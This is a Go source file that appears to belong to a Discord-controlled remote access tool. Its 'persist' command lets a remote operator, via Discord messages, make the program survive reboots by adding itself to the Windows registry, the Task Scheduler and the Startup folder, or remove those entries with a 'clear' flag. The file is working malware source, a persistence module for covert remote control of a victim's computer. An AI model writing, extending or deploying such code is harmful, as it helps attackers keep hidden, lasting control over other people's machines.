package commands_this

import (
	"fmt"

	"radithor/bot/discord"
	"radithor/core/persistence"
	"radithor/utils"
)

func persist(ctx *discord.CommandContext, args []string) {
	if utils.HasFlag(args, "clear") {
		errored := persistence.Unpersist()
		if errored {
			ctx.ReplyMsg("There were error(s) unpersisting. If logs are enabled, they have been saved there.")
		} else {
			ctx.ReplyMsg("Successfully unpersisted!")
		}

		return
	}

	if utils.HasFlag(args, "registry") || utils.HasFlag(args, "all") {
		err := persistence.AddToRegistry("")
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("Failed to persist with registry - %v", err))
		} else {
			ctx.ReplyMsg("Successfully persisted with registry!")
		}
	}

	if utils.HasFlag(args, "scheduler") || utils.HasFlag(args, "all") {
		err := persistence.AddToScheduler("")
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("Failed to persist with task scheduler - %v", err))
		} else {
			ctx.ReplyMsg("Successfully persisted with task scheduler!")
		}
	}

	if utils.HasFlag(args, "startup") || utils.HasFlag(args, "all") {
		err := persistence.AddToStartupFolder("")
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("Failed to persist with startup folder - %v", err))
		} else {
			ctx.ReplyMsg("Successfully persisted with startup folder!")
		}
	}
}
